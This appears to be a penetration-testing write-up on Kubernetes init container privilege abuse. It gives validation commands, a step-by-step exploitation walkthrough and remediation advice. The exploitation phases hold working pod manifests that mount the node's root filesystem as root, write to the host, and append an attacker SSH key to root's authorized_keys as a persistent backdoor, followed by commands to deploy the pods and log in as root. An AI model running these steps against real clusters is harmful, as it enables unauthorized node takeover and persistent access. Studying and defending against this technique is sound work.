
# Kubernetes Init Container Privilege Abuse

## 1. Overview

### Attack Vector Description

This vulnerability allows an attacker to escalate privileges and potentially gain full control of a Kubernetes cluster by exploiting overly permissive configurations of init containers. Init containers are specialized containers that run before application containers in a pod. If an init container is granted excessive privileges, such as running as root or having access to the host's filesystem, an attacker can leverage these privileges to compromise the pod and, potentially, the entire node and cluster. The attacker leverages these privileges to modify files, install malicious software, or extract sensitive information.

### Potential Impact and Consequences

*   **Compromised Pod:** The attacker gains full control over the pod and its resources.
*   **Node Compromise:** The attacker can use the compromised pod as a stepping stone to compromise the underlying node by leveraging hostPath volumes or other node-level access granted to the init container.
*   **Data Exfiltration:** Sensitive data stored within the pod or on the node can be exfiltrated.
*   **Lateral Movement:** The attacker can use the compromised node to move laterally to other nodes within the cluster.
*   **Denial of Service (DoS):** The attacker can disrupt services running on the compromised node or cluster.
*   **Cluster Takeover:** In the worst-case scenario, the attacker can gain complete control of the entire Kubernetes cluster.

### Risk Level Assessment

**Critical** - Due to the potential for complete cluster takeover.  An attacker gaining root on a node allows for further lateral movement within the cluster.

### Technical Explanation of Why This Vulnerability Exists

This vulnerability stems from misconfigurations in the pod's security context or init container specifications. Common misconfigurations include:

*   **Running as Root:**  The init container is allowed to run as the root user (UID 0).
*   **Privileged Mode:** The init container is running in privileged mode (securityContext.privileged: true).
*   **Host Network and PID Namespace Access:** The init container can access the host's network or PID namespace (hostNetwork: true, hostPID: true).
*   **HostPath Volumes:** The init container has read/write access to critical hostPath volumes (e.g., `/`, `/etc`, `/var/lib/kubelet`).
*   **Capability Overload:** Excessive Linux capabilities are granted.

When combined, these misconfigurations can enable an attacker to escape the container and compromise the underlying node.

### Prerequisites and Conditions Needed

*   **Permission to create pods:** The attacker needs to have sufficient RBAC permissions to create or modify pods within the target namespace.
*   **Vulnerable Init Container Configuration:** The attacker must identify a pod definition (or create one) with a vulnerable init container configuration (e.g., running as root, privileged mode, hostPath volume mounts).
*   **Cluster Configuration:** The cluster must be configured such that the vulnerable init container can be deployed. For example, Pod Security Policies (PSPs) or Pod Security Standards (PSS) must not be enforced in a way that prevents the vulnerable configuration.  Alternatively, these policies could be improperly configured.

## 2. Validation and Exploitation Steps

This section details how to validate and exploit the init container privilege abuse vulnerability.

**Phase 1: Validation - Identifying a Vulnerable Pod**

1.  **List pods and their security contexts:**

    ```bash
    kubectl get pods -n <target-namespace> -o yaml | grep -E "securityContext|initContainers:"
    ```

    *   **Explanation:** This command retrieves the YAML definition of all pods in the specified namespace and filters for lines containing "securityContext" or "initContainers:".  This allows a quick overview of pod security configurations, including init container configurations.
    *   **Why:** To identify potential pods with init containers that might have vulnerable security settings.
    *   **Expected Output:** YAML output containing pod specifications, including securityContext sections for pods and init containers. Look for `runAsUser: 0`, `privileged: true`, `hostPath` volume mounts in init container definitions.
    *   **Alternative:** `kubectl describe pod <pod-name> -n <target-namespace>` can provide more detailed information for a specific pod.

2.  **Inspect the init container's image:**

    ```bash
    kubectl get pod <pod-name> -n <target-namespace> -o jsonpath='{.spec.initContainers[0].image}'
    ```

    *   **Explanation:**  This command extracts the image name used by the first init container.
    *   **Why:**  Knowing the image allows us to examine its Dockerfile or perform static analysis to understand what capabilities the init container might possess.  Even seemingly harmless images could contain utilities that could be abused if run with elevated privileges.
    *   **Expected Output:** The name of the Docker image used by the init container (e.g., `busybox:latest`).

3.  **Inspect existing deployments and statefulsets:**

    ```bash
    kubectl get deployments.apps -n <target-namespace> -o yaml | grep -E "securityContext|initContainers:"
    kubectl get statefulsets.apps -n <target-namespace> -o yaml | grep -E "securityContext|initContainers:"
    ```

     *  **Explanation:**  This command searches deployments and statefulsets for vulnerable security contexts and init containers.
     *  **Why:**  Deployments and statefulsets define the pod specifications that are applied. If a vulnerable configuration exists in a deployment, every pod created from that deployment will likely be vulnerable.
     *  **Expected Output:** Similar to the pod listing, YAML output containing deployment and statefulset specifications.

**Phase 2: Exploitation - Gaining Node Access**

This example assumes a vulnerable init container with a `hostPath` volume mount and running as root. Adjust the steps according to the specific vulnerabilities identified.

1.  **Create a pod with a vulnerable init container.** Let's say the init container has a `hostPath` volume mounted to `/host` and runs as root. The following YAML definition describes such a pod. Save the below to `pod.yaml`:

    ```yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: exploit-pod
      namespace: default
    spec:
      initContainers:
        - name: exploit-init
          image: busybox:latest
          command: ["/bin/sh", "-c", "chroot /host bash -c 'echo \"Hacked!\" > /tmp/hacked.txt'"]
          volumeMounts:
            - name: host-volume
              mountPath: /host
          securityContext:
            runAsUser: 0  # Running as root
      containers:
        - name: pause
          image: k8s.gcr.io/pause:latest
      volumes:
        - name: host-volume
          hostPath:
            path: /  # Mounting the root filesystem
    ```

    *   **Explanation:** This YAML defines a pod named `exploit-pod` with an init container named `exploit-init`. The init container uses the `busybox:latest` image and mounts the host's root filesystem (`/`) to `/host`.  Crucially, it runs as root (UID 0). It then executes a command to write "Hacked!" to a file named `/tmp/hacked.txt` on the host.  The `pause` container is a placeholder that prevents the pod from immediately exiting.
    *   **Why:** This pod definition is designed to exploit the vulnerability by leveraging the root access within the init container to modify files on the host filesystem.
    *   **Expected Output:**  No direct output initially.

2.  **Deploy the pod:**

    ```bash
    kubectl apply -f pod.yaml
    ```

    *   **Explanation:** This command deploys the pod defined in `pod.yaml` to the Kubernetes cluster.
    *   **Why:** To create the pod and trigger the execution of the init container.
    *   **Expected Output:** `pod/exploit-pod created`

3.  **Verify the pod's status:**

    ```bash
    kubectl get pod exploit-pod -n default
    ```

    *   **Explanation:** This command checks the status of the deployed pod.
    *   **Why:** To ensure the pod is running or has completed its init containers.
    *   **Expected Output:**  The pod status should eventually be `Completed` or `Running`, indicating the init container has executed. If the status remains in `Init:0/1` state for a long period, there is a problem.

4.  **Check the host for the modified file:**

    You need to access the host node (e.g., via SSH).  How to access the node depends on the cloud provider or infrastructure setup.

    ```bash
    ssh <node-ip> "sudo cat /tmp/hacked.txt"  # Example using SSH.  Replace <node-ip>
    ```

    *   **Explanation:** This command connects to the node via SSH (or another method of node access) and uses `sudo` to read the `/tmp/hacked.txt` file that the init container attempted to create.
    *   **Why:** To confirm that the init container successfully modified the host filesystem.
    *   **Expected Output:** `Hacked!`

**Phase 3: Further Exploitation and Lateral Movement (Example)**

This demonstrates how to use the initial node access to gain persistent access and potentially move laterally.

1.  **Install a SSH key on the host (requires root):**

    Modify `pod.yaml` to add an SSH key to the authorized keys file.  This adds a persistent backdoor to the node.

    ```yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: exploit-pod
      namespace: default
    spec:
      initContainers:
        - name: exploit-init
          image: busybox:latest
          command: ["/bin/sh", "-c", "mkdir -p /host/root/.ssh && echo '<your-ssh-public-key>' >> /host/root/.ssh/authorized_keys && chmod 600 /host/root/.ssh/authorized_keys"]
          volumeMounts:
            - name: host-volume
              mountPath: /host
          securityContext:
            runAsUser: 0  # Running as root
      containers:
        - name: pause
          image: k8s.gcr.io/pause:latest
      volumes:
        - name: host-volume
          hostPath:
            path: /  # Mounting the root filesystem
    ```

    *   **Explanation:**  This modified YAML adds commands to the init container to create the `.ssh` directory (if it doesn't exist) and append the attacker's public SSH key to the `authorized_keys` file.  It also sets the correct permissions on the `authorized_keys` file. This allows the attacker to SSH directly into the node as root.
    *   **Why:** To establish persistent access to the compromised node.
    *   **Expected Output:** No direct output from kubectl.  After deployment and execution, the SSH key will be added to the node's root user's `authorized_keys` file.

2.  **Apply the modified pod definition:**

    ```bash
    kubectl apply -f pod.yaml
    ```

    *   **Explanation:** This command deploys the modified pod.
    *   **Why:** To execute the init container with the key injection payload.
    *   **Expected Output:** `pod/exploit-pod configured`

3.  **SSH into the node as root:**

    ```bash
    ssh root@<node-ip>
    ```

    *   **Explanation:** This command attempts to SSH into the node as the root user, using the SSH key that was injected in the previous steps.
    *   **Why:** To verify successful establishment of persistent access and demonstrate complete node compromise.
    *   **Expected Output:**  A shell prompt as the root user on the target node.

**Remediation Recommendations**

1.  **Apply Pod Security Standards (PSS):**  Use PSS to enforce secure pod configurations. The `restricted` profile should prevent most of these vulnerabilities.

2.  **Apply Pod Security Policies (PSP) or OPA Gatekeeper:** Implement PSPs (deprecated in favor of PSS) or OPA Gatekeeper policies to restrict the use of privileged containers, hostPath volumes, and running as root.

3.  **Principle of Least Privilege:**  Grant init containers only the minimal privileges necessary to perform their intended function. Avoid running init containers as root or in privileged mode whenever possible.

4.  **Minimize HostPath Volume Usage:**  Avoid using hostPath volumes unless absolutely necessary. If required, restrict the paths to specific directories with minimal permissions.

5.  **Image Scanning:** Regularly scan container images for known vulnerabilities.

6.  **Monitor and Audit:**  Implement monitoring and auditing to detect suspicious activity, such as unauthorized file modifications or privilege escalation attempts.

7.  **RBAC Hardening:** Review and tighten RBAC permissions to prevent unauthorized pod creation and modification.

8.  **Regular Security Audits:** Conduct regular security audits to identify and address potential vulnerabilities in Kubernetes configurations.
